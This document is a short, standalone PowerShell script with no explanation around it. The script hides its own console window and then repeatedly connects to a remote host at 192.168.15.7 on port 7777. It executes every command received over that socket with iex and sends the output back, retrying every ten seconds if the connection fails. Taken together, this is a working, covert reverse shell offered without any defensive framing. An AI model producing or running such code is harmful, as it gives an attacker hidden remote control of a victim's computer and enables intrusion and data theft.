$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
while($true){try{Set-Variable -Name c -Value (New-Object System.Net.Sockets.TCPClient('192.168.15.7',7777));Set-Variable -Name s -Value ($c.GetStream());Set-Variable -Name r -Value (New-Object System.IO.StreamReader($s));Set-Variable -Name w -Value (New-Object System.IO.StreamWriter($s));$w.AutoFlush=$true;while($c.Connected){$w.Write("PS "+(pwd).Path+"> ");Set-Variable -Name cmd -Value ($r.ReadLine());if($cmd -eq "exit"){$c.Close();break};Set-Variable -Name out -Value (iex $cmd 2>&1|Out-String);$w.WriteLine($out)}}catch{Start-Sleep -Seconds 10}}
